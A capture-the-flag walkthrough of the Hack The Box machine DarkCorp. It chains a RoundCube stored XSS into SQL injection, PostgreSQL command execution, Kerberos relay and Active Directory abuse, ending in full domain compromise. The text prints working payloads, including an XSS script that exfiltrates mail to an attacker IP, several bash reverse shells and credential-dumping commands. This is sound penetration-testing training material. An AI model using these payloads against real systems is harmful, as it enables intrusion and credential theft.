---
icon: building-flag
cover: ../../../../.gitbook/assets/Screenshot 2026-02-22 210925.png
coverY: -18.986475815295126
---

# HTB-DARKCORP

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scan

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ rustscan -a 10.10.11.54 blah blah
```

```
Open 10.10.11.54:22
Open 10.10.11.54:80

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Why this matters:** TTL of 127 on both ports suggests a Linux VM or container sitting one hop behind a Windows host — confirmed by the box presenting as Windows on HTB. The OpenSSH and nginx versions point to Debian 12 Bookworm.

***

### Web Enumeration

#### Virtual Host Discovery

Visiting `http://10.10.11.54` redirects via JavaScript to `http://drip.htb`. Since the webserver uses host-based routing, we fuzz for additional vhosts:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ ffuf -u http://10.10.11.54 -H "Host: FUZZ.drip.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

```
mail  [Status: 200, Size: 5323, Words: 366, Lines: 97, Duration: 61ms]
```

Adding both to `/etc/hosts`:

```
10.10.11.54 drip.htb mail.drip.htb
```

**Why this matters:** The main site is a marketing front; the mail subdomain exposes the actual attack surface.

#### drip.htb

The site has a contact form and a signup page. Directory brute-forcing returns nothing interesting beyond the main page. The contact form submits a POST with a user-controlled `recipient` field — suspicious.

#### mail.drip.htb — RoundCube Webmail

Registering on `drip.htb` and logging in at `mail.drip.htb` reveals a RoundCube webmail instance:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ feroxbuster -u http://drip.htb --dont-extract-links
```

```
200  GET  http://drip.htb/index
302  GET  http://drip.htb/ => index
302  GET  http://drip.htb/contact => index#contact
```

The "About" popup in RoundCube reveals version **1.6.7**.

**Why this matters:** RoundCube 1.6.7 is vulnerable to CVE-2024-42009, a stored XSS that triggers on email view without any user interaction.

***

### XSS via Contact Form — CVE-2024-42009

#### Modifying the Recipient

The contact form POST includes a `recipient` parameter that is fully user-controlled. Changing it to our own registered email:

```
name=sn0x&email=sn0x@drip.htb&message=test&content=text&recipient=sn0x%40drip.htb
```

The email arrives. We discover a new email address, `bcase@drip.htb`, from the sender field.

**Why this matters:** The admin mailbox owner is identified — this becomes our XSS target.

#### HTML Email Content

Setting `content=html` causes the server to render HTML in the email body. This is the injection point for CVE-2024-42009.

#### CVE-2024-42009 Background

The vulnerability exists in RoundCube's `message_body()` function. The post-processing regex that removes the `bgcolor` attribute:

```
/\s?bgcolor=["\']*[a-z0-9#]+["\']*/i
```

fails to check context. By nesting it inside another attribute value, the regex strips it out and reintroduces an `onanimationstart` handler into the body tag:

```html
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(origin) foo=bar">
  Foo
</body>
```

#### Loading a Remote Script

We base64-encode a payload to load a remote script and bypass quote issues:

```javascript
var script = document.createElement('script');
script.src = 'http://10.10.14.78/script.js';
document.head.appendChild(script);
```

Final payload sent to `bcase@drip.htb`:

```html
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=eval(atob('BASE64_HERE')) foo=bar">
  Foo
</body>
```

**Why this matters:** Since `HttpOnly` is set on both RoundCube cookies, we can't steal them directly — instead we use the XSS to act within the victim's browser session and read their emails.

***

### Reading bcase's Mail

#### Exfil Script

We set `script.js` to fetch emails 1–15 from the victim's inbox and send them back as base64:

```javascript
for (let i = 1; i <= 15; i++) {
    fetch(`http://mail.drip.htb/?_task=mail&_action=show&_uid=${i}&_mbox=INBOX&_extwin=1`, {mode: 'no-cors'})
        .then((resp) => resp.text())
        .then((text) => fetch(`http://10.10.14.78/?id=${i}&exfil=` + btoa(text)))
}
```

We run a Flask server to catch and decode the responses. After sending the XSS payload to `bcase@drip.htb`, we receive 3-4 emails. One of them contains a link to an internal dev dashboard:

```
dev-a3f1-01.drip.htb
```

**Why this matters:** The admin's inbox contains a credential reset link and internal URLs not discoverable through fuzzing.

***

### SQL Injection → RCE via PostgreSQL

#### Accessing the Dev Dashboard

Adding `dev-a3f1-01.drip.htb` to `/etc/hosts` and visiting it shows a login form. Using the "Reset Password" function with `bcase@drip.htb`, we intercept the reset link via our XSS mail reader and set a new password.

Logging in reveals an "Analytics" page at `/analytics`.

**Why this matters:** Any input that triggers a visible SQL error is almost certainly injectable.

#### SQL Injection

Any search input on `/analytics` produces a PostgreSQL error — classic unsanitized SQL. Fixing the query with `'sn0x';-- -` confirms injection. Stacked queries work:

```sql
'sn0x'; SELECT version();-- -
```

The backend runs as a PostgreSQL superuser.

#### Method 1 — COPY TO PROGRAM (Filtered)

The straightforward approach would be:

```sql
COPY (SELECT '') to PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.78/443 0>&1"';
```

However, the string `COPY` is filtered from queries. We bypass using `CHR()`:

```sql
'sn0x';DO $$ DECLARE cmd text; BEGIN cmd := CHR(67) || 'OPY (SELECT '''') to program ''bash -c "bash -i >& /dev/tcp/10.10.14.78/443 0>&1"'''; EXECUTE cmd; END $$;
```

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ nc -lnvp 443
Connection received on 10.10.11.54 60444
postgres@drip:/var/lib/postgresql/15/main$
```

**Why this matters:** `COPY TO PROGRAM` passes shell commands directly to the OS when the PostgreSQL user has superuser privileges.

#### Method 2 — archive\_command (Alternative RCE Path)

An alternative approach without needing `COPY`: read the PostgreSQL config via `lo_import`, modify `archive_command` to spawn a shell, and reload:

```sql
-- Read current config
'sn0x'; select lo_import('/etc/postgresql/15/main/postgresql.conf');-- -

-- Write modified config with:
-- archive_mode = 'always'
-- archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.78/443 0>&1"'
-- archive_timeout = 1
'sn0x'; select lo_from_bytea(223, decode('BASE64_CONFIG', 'base64'));-- -
'sn0x'; select lo_export(223, '/etc/postgresql/15/main/postgresql.conf');-- -

-- Reload config
SELECT pg_reload_conf();
```

After a few seconds, a shell arrives on our listener.

**Why this matters:** Two independent paths to RCE exist — the `archive_command` path works even when `COPY` is blocked and is useful as a backup method.

#### Shell Upgrade

```
postgres@drip:~$ script /dev/null -c bash
^Z
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ stty raw -echo; fg
reset
Terminal type? screen
postgres@drip:~$
```

***

### Enumeration as postgres

#### Container / Network

```
postgres@drip:~$ hostname; ifconfig
drip
inet 172.16.20.3
```

We're in a Linux container. `/etc/hosts` reveals:

```
172.16.20.1  DC-01 DC-01.darkcorp.htb darkcorp.htb
172.16.20.3  drip.darkcorp.htb
```

**Why this matters:** The DC is on the internal network — all further AD attacks pivot through this container.

#### Internal Ping Sweep

```
postgres@drip:~$ for i in {1..254}; do (ping -c 1 172.16.20.${i} | grep "bytes from" &); done

64 bytes from 172.16.20.1  (DC-01)
64 bytes from 172.16.20.2  (WEB-01)
64 bytes from 172.16.20.3  (this host)
```

#### Database Credential Dump

```
postgres@drip:/$ psql
postgres=# \connect dripmail
dripmail=# select * from "Admins";

 id | username |             password             |     email
----+----------+----------------------------------+----------------
  1 | bcase    | 465e929fc1e0853025faad58fc8cb47d | bcase@drip.htb
```

#### Postgres Logs — Leaked ebelford Hash

```
postgres@drip:/var/log/postgresql$ zcat *.gz | grep ebelford

STATEMENT: UPDATE Users SET password = 8bbd7f88841b4223ae63c8848969be86 WHERE username = ebelford;
```

Cracking via CrackStation returns: `ThePlague61780`

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ sshpass -p 'ThePlague61780' ssh ebelford@drip.htb
ebelford@drip:~$
```

**Why this matters:** A developer accidentally ran an `UPDATE` query with the plaintext password in the SQL statement — logged permanently by PostgreSQL.

#### GPG-Encrypted Backup

```
postgres@drip:/var/backups/postgres$ ls
dev-dripmail.old.sql.gpg
```

The Flask `.env` file at `/var/www/html/dashboard/.env` contains the DB password `2Qa2SsBkQvsc`. Using it with GPG decrypts the backup:

```
postgres@drip:/var/backups/postgres$ export TERM=xterm
postgres@drip:/var/backups/postgres$ gpg --batch -d dev-dripmail.old.sql.gpg
```

The dump reveals two additional admin entries including a new user:

```
2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb
```

Cracking via CrackStation: `victor1gustavo@#`

**Why this matters:** An old database backup encrypted with a reused application password exposes credentials for a domain account.

#### SOCKS Tunnel via ebelford SSH

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ sshpass -p 'ThePlague61780' ssh ebelford@drip.htb -D 1080
```

All subsequent domain attacks proxy through `127.0.0.1:1080`.

***

### Shell as Administrator@WEB-01

#### victor.r Domain Access

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ proxychains netexec smb 172.16.20.2 -u victor.r -p 'victor1gustavo@#'

SMB  WEB-01  [+] darkcorp.htb\victor.r:victor1gustavo@# 
```

`victor.r` also authenticates to the HTTP basic auth portal on `WEB-01:5000`.

#### Catching svc\_acc NTLM Hash via WEB-01 Check Form

WEB-01 port 5000 is a monitoring dashboard with a "Check Status" form that makes HTTP requests to a user-specified target. We use socat to forward traffic from inside the container to our listener, then point the check form at ourselves:

```
postgres@drip:/dev/shm$ ./socat TCP-LISTEN:8080,bind=0.0.0.0,fork TCP:10.10.14.78:80
```

Setting target to `drip.darkcorp.htb:8080` and running Responder:

```
[HTTP] NTLMv2 Username : darkcorp\svc_acc
[HTTP] NTLMv2 Hash     : svc_acc::darkcorp:ffdb62...
```

The hash doesn't crack, but BloodHound shows `svc_acc` is a member of `DNSADMINS`.

**Why this matters:** DNSAdmins members can create DNS records — which enables Kerberos relay attacks targeting AD CS.

***

### Silver Ticket via Kerberos Relay (krbrelayx)

#### Strategy Overview

1. Relay `svc_acc`'s NTLM auth to add a spoofed DNS record
2. Coerce WEB-01 to authenticate to that record (which resolves to us)
3. Relay the Kerberos ticket to AD CS to get a machine certificate for WEB-01
4. Use the certificate to get WEB-01$'s NTLM hash and forge a Silver Ticket as Administrator

#### Step 1 — Add DNS Record via NTLM Relay

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ proxychains ntlmrelayx.py -t 'ldap://172.16.20.1' --no-dump --no-smb-server --no-acl --no-da --no-validate-privs \
  --add-dns-record 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.14.78
```

Trigger by submitting a check request pointing at our host. When `svc_acc` authenticates:

```
[*] Authenticating against ldap://172.16.20.1 as DARKCORP/SVC_ACC SUCCEED
[*] Added `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` pointing to `10.10.14.78`
```

**Why this matters:** The appended `1UWhRC...` structure is an empty CREDENTIAL\_TARGET\_INFORMATION blob that makes the spoofed hostname trusted for Kerberos relay without modifying the existing DC-01 record.

#### Step 2 — Relay WEB-01 Kerberos to AD CS

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ proxychains krbrelayx.py -t 'https://dc-01.darkcorp.htb/certsrv/certfnsh.asp' --adcs -v 'WEB-01$'
```

Coerce WEB-01 auth using printer bug:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ proxychains uv run --script /opt/krbrelayx/printerbug.py 'darkcorp/victor.r':'victor1gustavo@#'@WEB-01.darkcorp.htb \
  dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

krbrelayx catches the authentication and enrolls a certificate:

```
[*] GOT CERTIFICATE! ID 5
[*] Writing PKCS#12 certificate to ./WEB-01$.pfx
```

#### Step 3 — Forge Silver Ticket

Get WEB-01$ NTLM hash from the certificate:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ proxychains certipy auth -pfx 'WEB-01$.pfx' -domain darkcorp.htb -dc-ip 172.16.20.1

[*] Got hash for 'web-01$@darkcorp.htb': aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675
```

Get domain SID:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ proxychains lookupsid.py -hashes :8f33c7fc7ff515c1f358e488fbb8b675 'darkcorp.htb/WEB-01$@DC-01.darkcorp.htb'

[*] Domain SID is: S-1-5-21-3432610366-2163336488-3604236847
```

Forge the Silver Ticket:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ ticketer.py -nthash 8f33c7fc7ff515c1f358e488fbb8b675 -domain darkcorp.htb \
  -domain-sid S-1-5-21-3432610366-2163336488-3604236847 \
  -spn cifs/web-01.darkcorp.htb Administrator

[*] Saving ticket in Administrator.ccache
```

Verify:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ KRB5CCNAME=Administrator.ccache proxychains netexec smb web-01.darkcorp.htb -k --use-kcache

SMB  WEB-01  [+] DARKCORP.HTB\Administrator from ccache (Pwn3d!)
```

#### Step 4 — Dump Hashes and Get Shell

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ KRB5CCNAME=Administrator.ccache proxychains secretsdump.py -k web-01.darkcorp.htb

Administrator:500:aad3b435b51404eeaad3b435b51404ee:88d84ec08dad123eb04a060a74053f21:::
```

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ proxychains evil-winrm-py -i web-01 -u administrator -H 88d84ec08dad123eb04a060a74053f21

evil-winrm-py PS C:\Users\Administrator\Desktop> cat user.txt
da2e66e0************************
```

***

### DPAPI — Recovering Administrator's Stored Credentials

#### Method 1 — DonPAPI (Remote)

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ KRB5CCNAME=Administrator.ccache proxychains -q DonPAPI collect -k --no-pass -t WEB-01.darkcorp.htb

[CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{...} - WEB-01\Administrator:But_Lying_Aid9!
```

#### Method 2 — netexec --dpapi

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ KRB5CCNAME=Administrator.ccache proxychains netexec smb 172.16.20.2 -u administrator --use-kcache --dpapi

[SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{...} - WEB-01\Administrator:But_Lying_Aid9!
```

#### Method 3 — Scheduled Task Abuse (Intended Path)

A scheduled task `CleanupScript` runs `cleanup.ps1` as the local Administrator every 2 minutes. Since we have write access to the script, we append credential extraction code:

```powershell
evil-winrm-py PS C:\> echo '$cred = Get-StoredCredential' >> C:\Users\Administrator\Documents\cleanup\cleanup.ps1
evil-winrm-py PS C:\> echo '$ncred = $cred.GetNetworkCredential()' >> C:\Users\Administrator\Documents\cleanup\cleanup.ps1
evil-winrm-py PS C:\> echo 'echo "$($ncred.Username) : $($ncred.Password)" > C:\programdata\out.txt' >> C:\Users\Administrator\Documents\cleanup\cleanup.ps1
evil-winrm-py PS C:\> Start-ScheduledTask -TaskName CleanupScript
evil-winrm-py PS C:\> cat \programdata\out.txt
Administrator : Pack_Beneath_Solid9!
```

**Why this matters:** Scheduled tasks run in the full user context including DPAPI-protected credential vaults — a low-privileged process cannot access these, but the task running as the credential owner can.

The second credential (`Pack_Beneath_Solid9!`) is an older stored password, separate from the current one. We spray it across domain users.

***

### Password Spray → john.w

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ proxychains netexec smb 172.16.20.1 -u users.txt -p 'Pack_Beneath_Solid9!' --continue-on-success

SMB  DC-01  [+] darkcorp.htb\john.w:Pack_Beneath_Solid9!
```

**Why this matters:** Password reuse between local admin accounts and domain users is a common enterprise misconfiguration.

***

### Shadow Credentials → angela.w

BloodHound shows `john.w` has `GenericWrite` over `angela.w`. We use this to set a shadow credential (Key Credential) on her account:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ proxychains certipy shadow auto -username john.w -p 'Pack_Beneath_Solid9!' \
  -account angela.w -target dc-01.darkcorp.htb

[*] NT hash for 'angela.w': 957246c8137069bca672dc6aa0af7c7a
```

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ proxychains netexec smb 172.16.20.1 -u angela.w -H 957246c8137069bca672dc6aa0af7c7a

SMB  DC-01  [+] darkcorp.htb\angela.w:957246c8137069bca672dc6aa0af7c7a
```

***

### UPN Spoofing → angela.w.adm on Linux

BloodHound shows `angela.w.adm` is a member of `linux_admins`, which has SSH access to the `drip` host. The attack abuses a Kerberos mismatch between Windows and Linux (MIT Kerberos) in how UPNs are resolved.

#### Set UPN on angela.w

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ proxychains bloodyAD --domain darkcorp.htb --host dc-01 -u john.w -p 'Pack_Beneath_Solid9!' \
  set object angela.w userPrincipalName -v angela.w.adm

[+] angela.w's userPrincipalName has been updated
```

#### Get TGT Using NT\_ENTERPRISE Principal Type

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ proxychains getTGT.py -hashes :957246c8137069bca672dc6aa0af7c7a \
  -principalType 'NT_ENTERPRISE' darkcorp.htb/angela.w.adm

[*] Saving ticket in angela.w.adm.ccache
```

**Why this matters:** Using `NT_ENTERPRISE` principal type forces the KDC to populate the ticket with the UPN rather than the sAMAccountName. Linux's MIT Kerberos trusts the UPN as the identity, so the ticket is accepted as `angela.w.adm`.

#### Upload and Authenticate on Linux Host

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ sshpass -p 'ThePlague61780' scp angela.w.adm.ccache ebelford@drip.htb:/dev/shm/
```

```
ebelford@drip:/dev/shm$ KRB5CCNAME=angela.w.adm.ccache ksu angela.w.adm
Authenticated angela.w.adm@DARKCORP.HTB
angela.w.adm@drip:/dev/shm$
```

#### Root on drip

`angela.w.adm` has full `NOPASSWD: ALL` sudo:

```
angela.w.adm@drip:/dev/shm$ sudo -i
root@drip:~#
```

***

### SSSD Cached Credential → taylor.b.adm

The Linux host uses SSSD for domain auth with `cache_credentials = True`. The cache is stored in `/var/lib/sss/db/`:

```
root@drip:/var/lib/sss/db# cat cache_darkcorp.htb.ldb | strings -n 60 | grep '\$'
$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.
```

The SHA-512 crypt hash belongs to `taylor.b.adm`. Cracking with hashcat:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ hashcat taylor.b.adm.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt

$6$5wwc6mW6nrcRD4Uu$....:!QAZzaq1
```

**Why this matters:** SSSD caches password hashes locally so users can log in while the DC is unreachable — these hashes can be extracted and cracked by root on the same machine.

Validating on the domain:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ proxychains netexec winrm 172.16.20.1 -u taylor.b.adm -p '!QAZzaq1'

WINRM  DC-01  [+] darkcorp.htb\taylor.b.adm:!QAZzaq1 (Pwn3d!)
```

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ proxychains evil-winrm-py -i dc-01 -u taylor.b.adm -p '!QAZzaq1'

evil-winrm-py PS C:\Users\taylor.b.adm\Documents>
```

***

### GPO Abuse → Administrator@DC-01

#### BloodHound — GPO Control

`taylor.b.adm` is a member of `gpo_manager`, which has `GenericWrite` over the `SECURITYUPDATES` GPO. This GPO applies to the DC.

**Why this matters:** Writing to a GPO that applies to the DC is equivalent to domain admin — any scheduled task or startup script added will run as SYSTEM on the DC.

#### pyGPOAbuse (AMSI Bypass)

SharpGPOAbuse is blocked by Windows Defender. We use pyGPOAbuse instead, which works remotely over SMB:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ proxychains uv run --script pygpoabuse.py 'darkcorp.htb/taylor.b.adm:!QAZzaq1' \
  -gpo-id 652CAE9A-4BB7-49F2-9E52-3361F33CE786 \
  -command 'net localgroup administrators taylor.b.adm /add' -f

[+] ScheduledTask TASK_0b270770 created!
```

After GPO refresh (or `gpupdate /force`):

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ proxychains netexec smb dc-01 -u taylor.b.adm -p '!QAZzaq1'

SMB  DC-01  [+] darkcorp.htb\taylor.b.adm:!QAZzaq1 (Pwn3d!)
```

#### Domain Secrets Dump

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ proxychains secretsdump.py 'darkcorp.htb/taylor.b.adm:!QAZzaq1@dc-01'

Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c032c3e2657f4554bc7af108bd5ef17:::
[... all domain hashes ...]
```

***

### Bonus — CVE-2025-49113 (Post-Auth RCE in RoundCube)

Released after DarkCorp's initial deployment, CVE-2025-49113 is a PHP Object Deserialization RCE in RoundCube affecting versions before 1.6.11. It requires a valid account but no admin privileges:

```
┌──(sn0x㉿sn0x)-[~/HTB/DarkCorp]
└─$ php CVE-2025-49113.php http://mail.drip.htb sn0x sn0x 'bash -c "bash -i >& /dev/tcp/10.10.14.78/443 0>&1"'
```

This lands a shell as `www-data`, which can then pivot to `postgres` following the same path as above.

**Why this matters:** Alternative initial foothold — skips the XSS chain entirely, but lands on the same host with a less privileged user.

***

### Attack Flow

```
Subdomain enum (mail.drip.htb)
    --> Contact form recipient control
        --> CVE-2024-42009 XSS (stored, no-click)
            --> bcase email exfil (dev dashboard URL)
                --> SQLi on dev dashboard analytics
                    --> COPY TO PROGRAM RCE (COPY keyword bypass via CHR())
                    --> OR archive_command RCE
                        --> postgres shell on drip container
                            --> Postgres log credential leak (ebelford)
                                --> GPG backup decrypt (victor.r creds)
                                    --> NTLM coerce → svc_acc (DNSAdmins)
                                        --> Kerberos relay → WEB-01$ certificate
                                            --> Silver Ticket as Administrator@WEB-01
                                                --> DPAPI dump (But_Lying_Aid9!)
                                                    --> Password spray → john.w
                                                        --> Shadow credential → angela.w hash
                                                            --> UPN spoof → angela.w.adm on Linux
                                                                --> sudo ALL → root@drip
                                                                    --> SSSD cache → taylor.b.adm hash
                                                                        --> GPO abuse → local admin on DC-01
                                                                            --> secretsdump → domain hashes
                                                                                --> Administrator@DC-01
```

***
